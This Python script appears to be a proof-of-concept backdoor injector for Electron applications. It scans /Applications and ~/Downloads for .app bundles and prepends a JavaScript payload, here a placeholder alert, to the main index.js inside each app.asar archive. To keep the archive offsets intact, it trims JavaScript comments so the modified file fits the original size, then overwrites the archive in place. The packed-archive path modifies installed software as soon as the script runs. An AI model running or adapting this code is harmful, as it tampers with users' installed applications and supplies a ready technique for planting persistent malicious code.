#! /bin/python
import sys
import os
import json
import struct
import re

BACKDOOR = b"alert('Code has been backdoored');\n"

class Asar:
	'''Class representing ASAR files'''
	def __init__(self, path):
		with open(path, 'rb') as f:
			f.seek(12) # Go to JSON header len in binary header
			hlen = struct.unpack('I', f.read(4))[0] # read len to 32 bit uint
			header = json.loads(f.read(hlen)) # read and parse JSON header

			# Read some specific information about the main js file.
			# In this case we use files/statics/files/index.js
			# Not all applications use this file and we could look for more than one.
			self.__size = header['files']['static']['files']['index.js']['size'] # Header size
			self.__offset = int(
				header['files']['static']['files']['index.js']['offset']
			) # Header offset (does not count binary header)

			self.__offset += 15 + hlen # Add binary header to offset 
			self.__path = path # File path
	def __read(self):
		'''Reads main js file in ASAR file'''
		with open(self.__path, 'rb') as f:
			f.seek(self.__offset) # Go to main js file
			self.__js = f.read(self.__size) # Read index.js
	def __resize(self):
		'''This function deletes JavaScript comments to avoid screwing up the offsets
		indicated in the header.
		This means we can overwrite the old js file with the new one without 
		overwriting anything else.
		'''

		# Finds //<stuff>\n and /*<stuff*/, i.e., Javascript comments.
		com_re = re.compile(b'\\/\\*.*?\\*\\/|\\/\\/[^\r\n]*\r*\n')

		for m in com_re.finditer(self.__js): # iterate through comments
			match = m.group(0) # The comment

			 # The difference between the current length of the file and how long it should be
			diff = len(self.__js) - self.__size

			# Can we just delete the whole thing without making the file too short?
			if len(match) <= diff and diff > 0:
				rep = b'' # Great.  Delete it.
			# If I delete the right number of characters will I wind up with a fraction of a comment? (Part 1)
			elif match.startswith(b'//') and len(match) - 3 < diff < len(match):
				rep = b'' # Yes.  Time to pad with newlines.
				while (len(match) + len(rep) - 3) < diff:
					rep += b'\n'
			# See above (Part 2)
			elif match.startswith(b'/*') and len(match) - 4 < diff < len(match):
				rep = b''
				while (len(match) + len(rep) - 4) < diff:
					rep += b'\n' # Newline padding
			# Can I fix the file size by deleting part of a multi line comment?
			elif match.startswith(b'/*') and len(match) > diff:
				rep = match[:len(match)-(diff+2)] # Delete part of the end
				rep += b'*/' # Add back closing characters
			# Can I fix the file size by deleting part of a single line comment?
			elif len(match) > diff:
				rep = match[:len(match)-(diff+1)] # Delete part of the end
				rep += b'\n' # Add back closing characters
			else:
				break
			self.__js = self.__js.replace(match, rep) # Revise targeted comment
	def __write(self):
		'''Overwrites only the main js file with modified one'''
		with open(self.__path, 'r+b') as f:
			f.seek(self.__offset)
			f.write(self.__js)
	def edit(self):
		self.__read() # Read
		self.__js = BACKDOOR + self.__js # Backdoor
		self.__resize() # Fix the file size to fit in archive
		self.__write() # Overwrite section of archive

def packed(path):
	'''This function unpacks edits and repacks app.asar files.'''
	app = Asar(path)
	app.edit()

def unpacked(path):
	'''Prepend backdoor to unpacked file'''
	with open(path, 'rb') as f:
		c = f.read()
	c = BACKDOOR + c
	'''with open(path, 'wb') as f:
		f.write(c)'''

def sort_osx(path):
	'''Checks if we have found an electron app and if so how it is packaged.'''
	if os.path.isfile(path+'/Contents/Resources/app.asar.unpacked/src/static/index.js'): # Unpacked
		unpacked(path+'/Contents/Resources/app.asar.unpacked/src/static/index.js')
	elif os.path.isfile(path+'/Contents/Resources/app/static/index.js'): # Atom unpacked
		unpacked(path+'/Contents/Resources/app/static/index.js')
	elif os.path.isfile(path+'/Contents/Resources/app.asar'): # Packed
		packed(path+'/Contents/Resources/app.asar')

def walk_osx(path):
	'''Walk directory and find .app folders'''
	path = os.path.expanduser(path)
	for root, dirs, files in os.walk(path):
		for d in dirs:
			if d.endswith('.app'):
				sort_osx(path+'/'+d)

if sys.platform.startswith('darwin'): # Is it OSX?
	walk_osx('/Applications')
walk_osx('~/Downloads')
